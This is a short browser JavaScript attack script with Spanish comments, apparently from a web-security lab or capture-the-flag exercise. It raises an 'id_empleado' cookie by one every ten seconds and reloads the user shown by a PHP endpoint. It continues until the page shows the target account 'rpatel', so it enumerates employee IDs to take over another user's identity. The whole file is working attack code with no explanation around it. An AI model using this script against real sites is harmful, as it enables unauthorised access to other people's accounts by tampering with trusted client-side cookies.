function encuentraUsuario(){
  //encuentra el valor del letrero donde se muestra el usuario entregando un string
  var usuario = document.getElementById("resultadoPHP").getElementsByTagName("li")[0].textContent;
  return usuario;
}

function aumentarCookie() {
  // Obtener el valor actual de la cookie 'id_empleado'
  var valorCookie = parseInt(document.cookie.replace(/(?:(?:^|.*;\s*)id_empleado\s*\=\s*([^;]*).*$)|^.*$/, "$1")) || 0;

  // Aumentar el valor de la cookie en 1
  valorCookie++;

  // Establecer la nueva cookie con el valor aumentado
  document.cookie = 'id_empleado=' + valorCookie;

}

// Función que busca un usuario en la cookie
function bucleCooky(usuarioObjetivo) {
  let usrActual = encuentraUsuario(); // Obtiene el usuario actual

  if (usrActual === usuarioObjetivo) {
    // Si el usuario actual es el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
    console.log("¡Usuario encontrado!");
    return;
  }

  const intervalId = setInterval(() => {
    aumentarCookie(); // Modifica la cookie con la que se hace la petición PHP
    username()
    usrActual = encuentraUsuario(); // Actualiza el usuario actual

    if (usrActual === usuarioObjetivo) {
      // Si se encuentra el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
      alert("¡Usuario encontrado!");
      clearInterval(intervalId); // Detiene el intervalo
    }
  }, 10000);
}

bucleCooky("rpatel"); // Llama a la función con el usuario a buscar


